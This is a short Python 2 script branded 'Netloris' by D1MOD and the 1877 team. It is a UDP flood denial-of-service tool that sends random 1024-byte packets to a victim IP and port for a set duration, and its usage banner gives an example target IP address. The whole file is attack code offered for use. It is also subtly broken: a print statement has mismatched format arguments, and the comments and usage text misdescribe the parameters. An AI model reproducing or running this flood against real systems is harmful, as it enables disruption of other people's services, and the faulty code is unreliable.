import time
import socket
import random
import sys



def usage():
	print '# ---------------------------------------------------#'
	print '# MADE BY D1MOD https://discord.gg/d1mod             #'
	print '# USAGE: python2 Netloris.py <IP> <PORT> <PACKET>    #'
	print '# EXAMPLE : python2 Netloris.py 95.159.73.4          #'
	print '# 1877 TEAM https://1877.team/                       #'
	print '# ---------------------------------------------------#'

  
def flood(victim, vport, duration):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 100000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "D1MOD1877 %s SEND %s ATTACKS %s "%()

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
